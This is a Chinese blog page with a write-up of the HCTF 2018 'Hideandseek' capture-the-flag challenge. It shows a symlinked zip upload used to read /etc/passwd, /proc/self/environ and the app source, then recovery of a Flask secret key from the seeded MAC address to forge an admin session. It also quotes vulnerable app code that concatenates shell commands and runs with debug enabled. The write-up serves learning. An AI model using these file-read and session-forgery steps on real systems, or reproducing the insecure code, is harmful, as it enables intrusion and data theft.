@@ -1,0 +1,740 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [HCTF 2018]Hideandseek |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="开题就让我们登录，我们随便登录一个账户  然后这里需要我们上传一个zip文件 我们随便上传一个普通zip文件，但没有任何回显  zip软链接读取文件 猜测是上传一个软链接zip 在linux里制作软链接zip： 12ln -s &#x2F;etc&#x2F;passwd azip -y passwd.zip a 然后上传a.zip文件  有回显了 读取&#x2F;proc&#x2F;self&#x2F;environ 读取&#x2F;app&#x2F;uwsgi.i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HCTF 2018]Hideandseek">
+<meta property="og:url" content="http://example.com/2025/05/28/[HCTF%202018]Hideandseek/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="开题就让我们登录，我们随便登录一个账户  然后这里需要我们上传一个zip文件 我们随便上传一个普通zip文件，但没有任何回显  zip软链接读取文件 猜测是上传一个软链接zip 在linux里制作软链接zip： 12ln -s &#x2F;etc&#x2F;passwd azip -y passwd.zip a 然后上传a.zip文件  有回显了 读取&#x2F;proc&#x2F;self&#x2F;environ 读取&#x2F;app&#x2F;uwsgi.i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528183243622.png">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528183556589.png">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528183625737.png">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528184050865.png">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528184222810.png">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528184250954.png">
+<meta property="og:image" content="http://example.com/2025/05/28/images/20250528185430201.png">
+<meta property="article:published_time" content="2025-05-28T10:30:41.000Z">
+<meta property="article:modified_time" content="2025-05-28T11:00:08.346Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="flask session伪造">
+<meta property="article:tag" content="软链接">
+<meta property="article:tag" content="伪随机数">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/28/images/20250528183243622.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[HCTF 2018]Hideandseek">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[HCTF 2018]Hideandseek</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#zip%E8%BD%AF%E9%93%BE%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> zip软链接读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%A7%8D%E5%AD%90"><span class="toc-number">2.</span> <span class="toc-text"> 制作伪随机数种子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0session"><span class="toc-number">3.</span> <span class="toc-text"> 伪造session</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[HCTF 2018]Hideandseek" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/28/%5BHCTF%202018%5DHideandseek/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-28T10:30:41.000Z" itemprop="datePublished">2025-05-28</time>
+    <time style="display: none;" id="post-update-time">2025-05-28</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>开题就让我们登录，我们随便登录一个账户</p>
+<p><img src="../images/20250528183243622.png" alt="image-20250528183243622" /></p>
+<p>然后这里需要我们上传一个zip文件</p>
+<p>我们随便上传一个普通zip文件，但没有任何回显</p>
+<h2 id="zip软链接读取文件"><a class="markdownIt-Anchor" href="#zip软链接读取文件"></a> zip软链接读取文件</h2>
+<p>猜测是上传一个软链接zip</p>
+<p>在linux里制作软链接zip：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd a</span><br><span class="line">zip -y passwd.zip a</span><br></pre></td></tr></table></figure>
+<p>然后上传a.zip文件</p>
+<p><img src="../images/20250528183556589.png" alt="image-20250528183556589" /></p>
+<p>有回显了</p>
+<p><strong>读取<code>/proc/self/environ</code></strong></p>
+<p><img src="../images/20250528183625737.png" alt="image-20250528183625737" /><strong>读取/app/uwsgi.ini</strong></p>
+<p>注意<code>DUWSGI_INI=/app/uwsgi.ini</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范。</span><br></pre></td></tr></table></figure>
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</span><br></pre></td></tr></table></figure>
+<p><strong>读取<code>源代码</code></strong></p>
+<p>由于buu环境的影响</p>
+<p><code>/app/uwsgi.ini</code>回显中应该是<code>module=/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p>
+<p>读取<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>即可得到源文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*100)</span><br><span class="line">app.config[&#x27;UPLOAD_FOLDER&#x27;] = &#x27;./uploads&#x27;</span><br><span class="line">app.config[&#x27;MAX_CONTENT_LENGTH&#x27;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&#x27;zip&#x27;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#x27;.&#x27; in filename and \</span><br><span class="line">           filename.rsplit(&#x27;.&#x27;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&#x27;error&#x27;, &#x27;&#x27;)</span><br><span class="line">    if(error == &#x27;1&#x27;):</span><br><span class="line">        session.pop(&#x27;username&#x27;, None)</span><br><span class="line">        return render_template(&#x27;index.html&#x27;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &#x27;username&#x27; in session:</span><br><span class="line">        return render_template(&#x27;index.html&#x27;, user=session[&#x27;username&#x27;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&#x27;username&#x27;]</span><br><span class="line">    password=request.form[&#x27;password&#x27;]</span><br><span class="line">    if request.method == &#x27;POST&#x27; and username != &#x27;&#x27; and password != &#x27;&#x27;:</span><br><span class="line">        if(username == &#x27;admin&#x27;):</span><br><span class="line">            return redirect(url_for(&#x27;index&#x27;,error=1))</span><br><span class="line">        session[&#x27;username&#x27;] = username</span><br><span class="line">    return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/logout&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&#x27;username&#x27;, None)</span><br><span class="line">    return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &#x27;the_file&#x27; not in request.files:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    file = request.files[&#x27;the_file&#x27;]</span><br><span class="line">    if file.filename == &#x27;&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &#x27;This file already exists&#x27;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;This file is not a zipfile&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &#x27;_&#x27;</span><br><span class="line">        os.system(&#x27;unzip -n &#x27; + file_save_path + &#x27; -d &#x27;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&#x27;cat &#x27; + extract_path + &#x27;/*&#x27;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&#x27;rm -rf &#x27; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&#x27;aGN0Zg==&#x27;).decode(&#x27;utf-8&#x27;)) != -1):</span><br><span class="line">            return redirect(url_for(&#x27;index&#x27;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=10008)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="制作伪随机数种子"><a class="markdownIt-Anchor" href="#制作伪随机数种子"></a> 制作伪随机数种子</h2>
+<p>源代码里<code>app.config['SECRET_KEY'] = str(random.random()*100)</code></p>
+<p>密钥是用伪随机数生成的</p>
+<p>但这里也告诉了我们种子</p>
+<p><code>random.seed(uuid.getnode())</code></p>
+<p>是<code>uuid.getnode()</code></p>
+<p><img src="../images/20250528184050865.png" alt="image-20250528184050865" /></p>
+<p>意思就是我们需要读取<strong>容器的mac地址</strong></p>
+<p>读取<code>/sys/class/net/eth0/address</code>来得到mac地址</p>
+<p><img src="../images/20250528184222810.png" alt="image-20250528184222810" /></p>
+<p><img src="../images/20250528184250954.png" alt="image-20250528184250954" /></p>
+<p>得到mac地址为<code>fa:d0:99:27:aa:49</code></p>
+<p><strong>由mac地址得到伪随机数种子</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import uuid</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">mac = &quot;02:42:ac:10:9e:a1&quot;</span><br><span class="line">temp = mac.split(&#x27;:&#x27;)</span><br><span class="line">temp = [int(i,16) for i in temp]</span><br><span class="line">temp = [bin(i).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in temp]</span><br><span class="line">temp = &#x27;&#x27;.join(temp)</span><br><span class="line">mac = int(temp,2)</span><br><span class="line">print(mac)#将mac转为十进制</span><br><span class="line"></span><br><span class="line">random.seed(mac)</span><br><span class="line">print(random.random()*100)#由转化后的mac得到伪随机数种子</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">275773829655113</span><br><span class="line">29.698516498043436</span><br></pre></td></tr></table></figure>
+<h2 id="伪造session"><a class="markdownIt-Anchor" href="#伪造session"></a> 伪造session</h2>
+<p><img src="../images/20250528185430201.png" alt="image-20250528185430201" /></p>
+<p>替换session</p>
+<p>得到flag</p>
+<p>192.168.52.201</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/flask-session%E4%BC%AA%E9%80%A0/" rel="tag">flask session伪造</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" rel="tag">伪随机数</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E9%93%BE%E6%8E%A5/" rel="tag">软链接</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/bizhi1.png" data-sizes="auto" alt="[NPUCTF2020]web🐕" class="lazyload">
+          
+        
+        <a href="/2025/05/29/%5BNPUCTF2020%5Dweb%F0%9F%90%95/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [NPUCTF2020]web🐕
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[CISCN2021 Quals]upload" class="lazyload">
+        
+      
+      <a href="/2025/05/28/%5BCISCN2021%20Quals%5Dupload/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [CISCN2021 Quals]upload
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#zip%E8%BD%AF%E9%93%BE%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> zip软链接读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%A7%8D%E5%AD%90"><span class="toc-number">2.</span> <span class="toc-text"> 制作伪随机数种子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0session"><span class="toc-number">3.</span> <span class="toc-text"> 伪造session</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
